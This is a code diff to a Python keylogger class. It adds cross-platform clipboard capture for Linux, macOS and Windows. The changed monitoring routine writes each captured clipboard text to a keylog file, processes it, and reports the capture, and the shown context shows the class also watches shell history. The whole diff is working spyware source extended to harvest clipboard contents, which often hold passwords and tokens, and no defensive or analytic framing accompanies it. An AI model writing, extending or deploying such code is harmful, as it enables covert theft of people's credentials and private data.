@@ -122,27 +122,76 @@ class Keylogger:
                 pass
             time.sleep(0.5)
             
+    def _get_clipboard_content(self):
+        """Get clipboard content cross-platform"""
+        import subprocess
+        import platform
+        
+        system = platform.system().lower()
+        clipboard_content = ""
+        
+        # Detect display server on Linux
+        if system == 'linux':
+            # Check if Wayland
+            try:
+                import os
+                session_type = os.environ.get('XDG_SESSION_TYPE', '').lower()
+                if 'wayland' in session_type:
+                    # Wayland: try wl-paste first, then xclip
+                    for cmd in [['wl-paste'], ['xclip', '-selection', 'clipboard', '-o'], ['xsel', '--clipboard']]:
+                        try:
+                            result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
+                            if result.stdout.strip():
+                                clipboard_content = result.stdout.strip()
+                                break
+                        except:
+                            continue
+                else:
+                    # X11: try xclip, xsel
+                    for cmd in [['xclip', '-selection', 'clipboard', '-o'], ['xsel', '--clipboard']]:
+                        try:
+                            result = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
+                            if result.stdout.strip():
+                                clipboard_content = result.stdout.strip()
+                                break
+                        except:
+                            continue
+            except:
+                pass
+        
+        elif system == 'darwin':  # macOS
+            try:
+                result = subprocess.run(['pbpaste'], capture_output=True, text=True, timeout=2)
+                if result.stdout.strip():
+                    clipboard_content = result.stdout.strip()
+            except:
+                pass
+        
+        elif system == 'windows':
+            try:
+                result = subprocess.run(['powershell', '-Command', 'Get-Clipboard'], 
+                                       capture_output=True, text=True, timeout=2)
+                if result.stdout.strip():
+                    clipboard_content = result.stdout.strip()
+            except:
+                pass
+        
+        return clipboard_content
+    
     def _monitor_terminal_input(self):
         """Monitor terminal and clipboard for input"""
         timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        # Check clipboard
+        # Check clipboard (cross-platform)
         try:
-            import subprocess
-            result = subprocess.run(
-                ['xclip', '-selection', 'clipboard', '-o'],
-                capture_output=True,
-                text=True,
-                timeout=1
-            )
-            if result.stdout and len(result.stdout.strip()) > 0:
-                clipboard_text = result.stdout.strip()
+            clipboard_text = self._get_clipboard_content()
+            if clipboard_text and len(clipboard_text) > 0:
                 with open(self.keylog_file, 'a') as f:
                     f.write(f'\n\n[{timestamp}] === CLIPBOARD ===\n{clipboard_text}\n======================\n\n')
                 self._process_text(clipboard_text)
                 print(f"[+] Clipboard captured: {len(clipboard_text)} chars")
         except Exception as e:
-            pass
+            print(f"[-] Clipboard error: {e}")
         
         # Monitor .bash_history
         try:
